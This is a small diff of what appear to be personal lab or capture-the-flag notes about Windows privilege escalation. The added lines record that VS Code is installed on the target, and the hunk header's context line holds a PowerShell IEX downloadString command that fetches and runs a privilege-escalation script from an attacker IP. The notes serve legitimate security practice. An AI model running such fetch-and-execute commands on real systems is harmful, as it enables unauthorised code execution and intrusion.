@@ -65,3 +65,11 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/Pri
 
 ![[Pasted image 20240924225659.png]]
 
+So what's the thing that stands outttttttttttttttttttt.
+Microsoft VS Code            C:\Program Files\Microsoft VS Code
+![[Pasted image 20240924233613.png]]
+
+```
+C:\Program Files\Microsoft VS Code
+```
+
